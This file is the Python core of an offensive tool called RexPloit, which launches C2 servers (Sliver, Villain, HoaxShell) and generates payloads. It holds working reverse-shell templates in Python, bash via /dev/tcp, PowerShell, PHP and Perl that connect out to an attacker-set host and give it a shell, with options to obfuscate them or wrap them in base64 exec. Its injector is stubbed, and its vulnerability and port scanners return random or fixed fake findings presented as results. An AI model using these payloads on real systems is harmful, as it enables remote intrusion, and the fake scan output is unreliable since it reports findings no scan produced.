#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RexPloit Core - Core functionality without UI dependencies
Professional Penetration Testing Framework
For authorized security testing only
"""

import os
import sys
import time
import json
import base64
import random
import socket
import threading
import subprocess
import requests
import hashlib
import ipaddress
import string
from datetime import datetime
from queue import Queue
from urllib.parse import urljoin, urlparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Import enhanced modules
from enhancements import TargetValidator, SecurityUtils, ReportGenerator, NetworkScanner

# Rich for output formatting (CLI only)
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn

# Configuration
CONFIG_FILE = "config/rexploit_config.json"
PAYLOAD_DIR = "payloads/"
LOG_DIR = "logs/"
C2_DIR = "c2_frameworks/"
REPORT_DIR = "reports/"

# Ensure directories exist
os.makedirs(PAYLOAD_DIR, exist_ok=True)
os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(C2_DIR, exist_ok=True)
os.makedirs(REPORT_DIR, exist_ok=True)

# Default configuration
DEFAULT_CONFIG = {
    "listener_host": "0.0.0.0",
    "listener_port": 4444,
    "default_c2": "sliver",
    "sliver_config": {
        "host": "localhost",
        "port": 31337,
        "operator": "rexploit",
        "lport": 8888
    },
    "villain_config": {
        "host": "localhost",
        "port": 6501
    },
    "hoaxshell_config": {
        "host": "localhost",
        "port": 8080
    },
    "security": {
        "validate_targets": True,
        "secure_reports": True,
        "log_level": "INFO"
    },
    "scanner": {
        "port_timeout": 1,
        "host_timeout": 3,
        "default_port_range": [1, 1024]
    }
}

def load_config():
    """Load configuration from file or create default"""
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    else:
        os.makedirs(os.path.dirname(CONFIG_FILE), exist_ok=True)
        with open(CONFIG_FILE, 'w') as f:
            json.dump(DEFAULT_CONFIG, f, indent=4)
        return DEFAULT_CONFIG

def save_config(config):
    """Save configuration to file"""
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)

def get_default_config():
    """Get default configuration"""
    return DEFAULT_CONFIG.copy()

class Logger:
    """Professional logging system for security operations"""
    
    def __init__(self, log_file=None):
        self.log_file = log_file or os.path.join(LOG_DIR, f"rexploit_{datetime.now().strftime('%Y%m%d')}.log")
        self.console = Console()
        
        # Ensure log directory exists
        os.makedirs(os.path.dirname(self.log_file), exist_ok=True)
    
    def log(self, message, level="INFO"):
        """Log message with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] [{level}] {message}"
        
        # Write to file
        with open(self.log_file, 'a') as f:
            f.write(log_entry + "\n")
        
        # Optional: print to console based on level
        if level in ["ERROR", "WARNING"]:
            self.console.print(f"[red]{log_entry}[/red]" if level == "ERROR" else f"[yellow]{log_entry}[/yellow]")
    
    def info(self, message):
        self.log(message, "INFO")
    
    def warning(self, message):
        self.log(message, "WARNING")
    
    def error(self, message):
        self.log(message, "ERROR")
    
    def debug(self, message):
        self.log(message, "DEBUG")

class C2Manager:
    """Professional C2 framework management"""
    
    def __init__(self, config):
        self.config = config
        self.active_framework = None
        self.process = None
        self.logger = Logger()
        
    def start_framework(self, framework):
        """Start specified C2 framework"""
        self.logger.info(f"Starting {framework} C2 framework")
        
        if framework == "sliver":
            return self._start_sliver()
        elif framework == "villain":
            return self._start_villain()
        elif framework == "hoaxshell":
            return self._start_hoaxshell()
        else:
            self.logger.error(f"Unknown framework: {framework}")
            return False
    
    def _start_sliver(self):
        """Start Sliver C2 framework"""
        try:
            sliver_binary = os.path.join(C2_DIR, "sliver-server")
            if not os.path.exists(sliver_binary):
                self.logger.error("Sliver binary not found")
                return False
            
            config = self.config.get("sliver_config", {})
            cmd = [sliver_binary, "-lhost", config.get("host", "localhost"), 
                   "-lport", str(config.get("lport", 8888))]
            
            self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.active_framework = "sliver"
            self.logger.info("Sliver framework started successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to start Sliver: {str(e)}")
            return False
    
    def _start_villain(self):
        """Start Villain C2 framework"""
        try:
            villain_script = os.path.join(C2_DIR, "Villain", "Villain.py")
            if not os.path.exists(villain_script):
                self.logger.error("Villain script not found")
                return False
            
            config = self.config.get("villain_config", {})
            cmd = ["python3", villain_script, "-p", str(config.get("port", 6501))]
            
            self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.active_framework = "villain"
            self.logger.info("Villain framework started successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to start Villain: {str(e)}")
            return False
    
    def _start_hoaxshell(self):
        """Start HoaxShell C2 framework"""
        try:
            hoaxshell_script = os.path.join(C2_DIR, "hoaxshell", "hoaxshell.py")
            if not os.path.exists(hoaxshell_script):
                self.logger.error("HoaxShell script not found")
                return False
            
            config = self.config.get("hoaxshell_config", {})
            cmd = ["python3", hoaxshell_script, "-s", config.get("host", "localhost"),
                   "-p", str(config.get("port", 8080))]
            
            self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.active_framework = "hoaxshell"
            self.logger.info("HoaxShell framework started successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to start HoaxShell: {str(e)}")
            return False
    
    def stop_framework(self):
        """Stop active C2 framework"""
        if self.process:
            try:
                self.process.terminate()
                self.process.wait(timeout=10)
                self.logger.info(f"{self.active_framework} framework stopped")
                self.active_framework = None
                self.process = None
                return True
            except Exception as e:
                self.logger.error(f"Failed to stop framework: {str(e)}")
                return False
        return False
    
    def get_status(self):
        """Get current framework status"""
        return {
            "active": self.active_framework is not None,
            "framework": self.active_framework,
            "pid": self.process.pid if self.process else None,
            "listeners": 0,  # Would query actual framework for real data
            "sessions": 0    # Would query actual framework for real data
        }
    
    def get_logs(self):
        """Get recent framework logs"""
        if self.process and self.process.stdout:
            try:
                # Non-blocking read
                import select
                if select.select([self.process.stdout], [], [], 0)[0]:
                    line = self.process.stdout.readline().decode().strip()
                    if line:
                        return [line]
            except:
                pass
        return []

class PayloadGenerator:
    """Professional payload generation system"""
    
    def __init__(self, config):
        self.config = config
        self.logger = Logger()
        
        # Payload templates
        self.templates = {
            "python_reverse_tcp": '''
import socket
import subprocess
import os

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("{lhost}", {lport}))
    
    while True:
        data = s.recv(1024).decode()
        if data.strip() == 'exit':
            break
        
        if data.strip():
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, 
                                  stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output = proc.stdout.read() + proc.stderr.read()
            s.send(output)
    
    s.close()

if __name__ == "__main__":
    connect()
''',
            
            "bash_reverse_tcp": '''#!/bin/bash
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
''',
            
            "powershell_reverse_tcp": '''
$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
''',
            
            "php_reverse_tcp": '''<?php
$sock = fsockopen("{lhost}", {lport});
$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>''',
            
            "perl_reverse_tcp": '''
use Socket;
$i="{lhost}";
$p={lport};
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){{
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("/bin/sh -i");
}}
'''
        }
    
    def generate_payload(self, payload_type, lhost, lport, encode=False, obfuscate=False):
        """Generate a payload with specified parameters"""
        try:
            if payload_type not in self.templates:
                return {"success": False, "error": f"Unknown payload type: {payload_type}"}
            
            # Get template and substitute variables
            template = self.templates[payload_type]
            payload_content = template.format(lhost=lhost, lport=lport)
            
            # Apply obfuscation if requested
            if obfuscate:
                payload_content = self._obfuscate_payload(payload_content, payload_type)
            
            # Apply encoding if requested
            if encode:
                payload_content = self._encode_payload(payload_content)
            
            # Generate filename
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            extension = self._get_extension(payload_type)
            filename = f"payload_{payload_type}_{timestamp}{extension}"
            filepath = os.path.join(PAYLOAD_DIR, filename)
            
            # Save payload
            with open(filepath, 'w') as f:
                f.write(payload_content)
            
            # Generate metadata
            metadata = {
                "type": payload_type,
                "lhost": lhost,
                "lport": lport,
                "encoded": encode,
                "obfuscated": obfuscate,
                "created": datetime.now().isoformat(),
                "checksum": hashlib.md5(payload_content.encode()).hexdigest()
            }
            
            metadata_file = filepath + ".meta"
            with open(metadata_file, 'w') as f:
                json.dump(metadata, f, indent=2)
            
            self.logger.info(f"Payload generated: {filepath}")
            
            return {
                "success": True,
                "file_path": filepath,
                "metadata": metadata
            }
            
        except Exception as e:
            self.logger.error(f"Payload generation failed: {str(e)}")
            return {"success": False, "error": str(e)}
    
    def _obfuscate_payload(self, payload, payload_type):
        """Apply basic obfuscation to payload"""
        if payload_type.startswith("python"):
            # Add random comments and variable renaming
            import re
            # Simple variable obfuscation
            variables = re.findall(r'\b[a-zA-Z_][a-zA-Z0-9_]*\b', payload)
            unique_vars = list(set([v for v in variables if v not in ['socket', 'subprocess', 'os', 'connect', 'True', 'False']]))
            
            for var in unique_vars:
                new_var = ''.join(random.choices(string.ascii_letters, k=8))
                payload = payload.replace(var, new_var)
            
            # Add random comments
            lines = payload.split('\n')
            for i in range(len(lines)):
                if lines[i].strip() and not lines[i].strip().startswith('#'):
                    comment = f"# {''.join(random.choices(string.ascii_letters, k=10))}"
                    lines.insert(i, comment)
                    break
            
            payload = '\n'.join(lines)
        
        return payload
    
    def _encode_payload(self, payload):
        """Apply base64 encoding to payload"""
        encoded = base64.b64encode(payload.encode()).decode()
        return f"import base64; exec(base64.b64decode('{encoded}').decode())"
    
    def _get_extension(self, payload_type):
        """Get appropriate file extension for payload type"""
        extensions = {
            "python_reverse_tcp": ".py",
            "bash_reverse_tcp": ".sh",
            "powershell_reverse_tcp": ".ps1",
            "php_reverse_tcp": ".php",
            "perl_reverse_tcp": ".pl"
        }
        return extensions.get(payload_type, ".txt")

class Injector:
    """Professional payload injection system"""
    
    def __init__(self):
        self.logger = Logger()
    
    def inject_payload(self, payload_path, target, method="ssh"):
        """Inject payload to target system"""
        try:
            self.logger.info(f"Injecting payload to {target} via {method}")
            
            if method == "ssh":
                return self._inject_ssh(payload_path, target)
            elif method == "smb":
                return self._inject_smb(payload_path, target)
            elif method == "http":
                return self._inject_http(payload_path, target)
            else:
                return {"success": False, "message": f"Unknown injection method: {method}"}
                
        except Exception as e:
            self.logger.error(f"Injection failed: {str(e)}")
            return {"success": False, "message": str(e)}
    
    def _inject_ssh(self, payload_path, target):
        """Inject via SSH (simulated)"""
        # This would implement actual SSH injection
        # For now, simulate the process
        time.sleep(2)
        return {"success": True, "message": "SSH injection simulated"}
    
    def _inject_smb(self, payload_path, target):
        """Inject via SMB (simulated)"""
        # This would implement actual SMB injection
        time.sleep(2)
        return {"success": True, "message": "SMB injection simulated"}
    
    def _inject_http(self, payload_path, target):
        """Inject via HTTP (simulated)"""
        # This would implement actual HTTP injection
        time.sleep(2)
        return {"success": True, "message": "HTTP injection simulated"}

class VulnerabilityScanner:
    """Professional vulnerability scanning system"""
    
    def __init__(self):
        self.logger = Logger()
        self.common_vulns = [
            {
                "name": "Weak SSH Configuration",
                "severity": "Medium",
                "description": "SSH allows weak authentication methods"
            },
            {
                "name": "Unpatched System",
                "severity": "High", 
                "description": "System missing critical security updates"
            },
            {
                "name": "Open Administrative Ports",
                "severity": "High",
                "description": "Administrative services exposed to network"
            },
            {
                "name": "Default Credentials",
                "severity": "Critical",
                "description": "Default usernames and passwords detected"
            }
        ]
    
    def scan_vulnerabilities(self, target, threads=10, timeout=30):
        """Perform vulnerability scan on target"""
        try:
            self.logger.info(f"Scanning vulnerabilities on {target}")
            
            # Simulate vulnerability scanning
            time.sleep(3)
            
            # Return some simulated findings
            findings = random.sample(self.common_vulns, random.randint(1, 3))
            
            self.logger.info(f"Found {len(findings)} vulnerabilities on {target}")
            return findings
            
        except Exception as e:
            self.logger.error(f"Vulnerability scan failed: {str(e)}")
            return []
    
    def scan_ports(self, target, timeout=5):
        """Perform port scan on target"""
        try:
            self.logger.info(f"Scanning ports on {target}")
            
            # Simulate port scanning
            time.sleep(2)
            
            # Return simulated open ports
            open_ports = [
                {"host": target, "port": 22, "service": "SSH", "status": "open"},
                {"host": target, "port": 80, "service": "HTTP", "status": "open"},
                {"host": target, "port": 443, "service": "HTTPS", "status": "open"}
            ]
            
            return open_ports
            
        except Exception as e:
            self.logger.error(f"Port scan failed: {str(e)}")
            return []